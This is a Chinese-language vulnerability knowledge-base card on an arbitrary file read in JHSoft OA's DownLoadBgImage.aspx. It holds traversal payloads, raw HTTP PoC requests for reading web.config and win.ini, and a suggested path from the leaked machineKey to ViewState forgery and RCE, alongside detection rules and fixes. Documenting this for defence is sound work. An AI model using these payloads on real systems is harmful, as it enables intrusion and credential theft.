---
id: web-generic-file-inclusion-jhsoft-downloadbgimage-path-read
title: JHSoft OA DownLoadBgImage.aspx 的 path 参数直入 Server.MapPath/File.OpenRead：任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: dotnet-aspx-path-param-map-path-openread
tags:
- file-inclusion
- file-read
- path-traversal
- dotnet
- aspx
- iis
- oa
- jhsoft
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:28+08:00'
  notes: 已对照原文与 img/22-24 核对 Page_Load 取 path/pathType、DownLoad 中 pathType!=1 才 MapPath、File.Exists/File.OpenRead/BinaryWrite 回显；复现请求 path=/C6/.../DownLoadBgImage.aspx&pathType=0 返回 302 跳 /C6/index.htm。未验证点：原文未展示成功读取文件，可能存在登录/鉴权跳转，卡内已注明。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-jhsoft-downloadbgimage-path-read/
draft: false
kb_aliases:
- JHSoft 任意文件读取
- 金和 OA 任意文件下载
- DownLoadBgImage.aspx 文件读取
- pathType 参数绕过
- LoginTemplate 背景图下载
---

## 一句话结论

JHSoft OA 登录模板目录下的 `DownLoadBgImage.aspx` 把请求参数 `path` 直接交给 `Server.MapPath` 与 `File.OpenRead`，仅用 `pathType` 决定是否做路径映射，没有任何目录约束或过滤；攻击者可读取 `web.config`、源码与系统文件，`pathType=1` 时还可直接传入绝对路径跳过 `MapPath`。

## 原理

- `Page_Load`：`string text = base.Request["path"]; string pathType = base.Request["pathType"];`，只要 `path` 非空就调用 `DownLoad(text, pathType)`。
- `DownLoad` 中：`if (pathType != "1") { filePath = base.Server.MapPath(filePath); }`；随后用 `File.Exists(filePath)` 检查并通过 `File.OpenRead` 读取全部字节，最后 `Response.BinaryWrite(array)` 回显，响应头 `Content-Disposition: attachment; filename=image<原扩展名>`。
- 关键缺陷：`path` 未做 `Path.GetFileName`、未规范化、未校验是否位于模板目录。`pathType != "1"` 时 `Server.MapPath` 会解析 `..\`、`../`、绝对路径；`pathType == "1"` 时连 `MapPath` 都跳过，直接把原字符串当物理路径使用，可直接指定 `C:\Windows\win.ini` 等绝对路径。
- 读取没有后缀白名单：`s = "image" + filePath.Substring(filePath.LastIndexOf("."))` 只影响下载文件名，不限制目标文件类型。
- 任意文件读取本身可直取站点 `web.config`，其中的 `machineKey`（validationKey/decryptionKey）可用于伪造 ViewState 实现 RCE，`connectionStrings`/`appSettings` 可用于横向；这是从文件读取到后续利用的关键跳板。
- 文章的复现请求返回 302 跳转到 `/C6/index.htm`，说明该模板页可能受统一鉴权模块（`JHSoft.Log.HttpModule`）或登录态检查影响；实际利用前需确认是否需要有效会话。

## 触发条件

- 目标存在 `C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx`。
- 请求能到达 `DownLoad`（未被鉴权模块重定向；必要时携带有效会话）。
- `pathType` 可控；未传或非 `"1"` 时按 `Server.MapPath` 解析，`"1"` 时按原始物理路径读取。
- 应用池进程对目标文件有读权限（站点目录、`C:\Windows` 一般可读）。

## 利用步骤

1. 先请求 `?path=<某个存在的图片路径>&pathType=0`，确认接口返回文件内容而不是 302/错误页。
2. 读取站点配置：`?path=/web.config&pathType=0` 或 `?path=..\..\web.config&pathType=0`；若站点部署在虚拟目录，按实际层级调整 `..\` 数量。
3. 读取源码/日志：`?path=..\JHSoft.Web.AddMenu\LoginTemplate\DownLoadBgImage.aspx`、`?path=..\..\App_Data\...`。
4. 使用 `pathType=1` 直接指定绝对路径：`?path=C:\Windows\win.ini&pathType=1`（需 URL 编码反斜杠/冒号）。
5. 从 `web.config` 提取 `machineKey`、连接串，转入 ViewState 伪造或数据库横向（见关联卡）。

## PoC

```http
GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx?path=/web.config&pathType=0 HTTP/1.1
Host: target.example

GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx?path=C%3A%5CWindows%5Cwin.ini&pathType=1 HTTP/1.1
Host: target.example
```

```text
# 成功时响应体为目标文件原始内容，Content-Disposition 带 image<后缀>
# 文章截图中的请求 path=/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx&pathType=0
# 返回 302 -> /C6/index.htm，提示存在登录/鉴权跳转，复现需先确认会话要求
```

## 变体与关联

- 变体：`pathType=1` 跳过 `Server.MapPath`，优先尝试绝对路径；`pathType=0` 时用 `..\`/`../` 或 `%2e%2e%2f` 穿越。
- 变体：若 `path` 带后缀过滤，可先读带正常后缀的文件或利用分号/编码绕过；本代码未做白名单。
- 关联：[[web-generic-file-inclusion-aspx-report-param-traversal-webconfig]]（ASP.NET 参数路径遍历读取 web.config 与 MachineKey）；[[web-generic-file-inclusion-dotnet-handler-gettxt-path-read]]（.NET Handler path 直拼 FileStream 同类）。
- 边界：文章只给出一次 302 的请求截图，未展示成功读取文件的响应；`DownLoadBgImage` 可能要求登录会话，实际可达性需实测。原文未标注受影响版本。

## 检测与防御

- 检测：`DownLoadBgImage.aspx` 请求的 `path` 出现 `..`、`%2e%2e`、`web.config`、`win.ini`、盘符或反斜杠；`pathType=1` 携带绝对路径；下载响应返回非图片文件。
- 修复：不要用请求参数拼物理路径；用文件 ID 映射到服务端白名单路径，或 `Path.GetFileName` 取 basename 后只允许固定扩展名与固定目录。
- 加固：`Path.GetFullPath` 规范化后校验前缀必须位于模板目录内；拒绝绝对路径；`web.config` 设置 ACL；对本接口增加登录与权限校验。
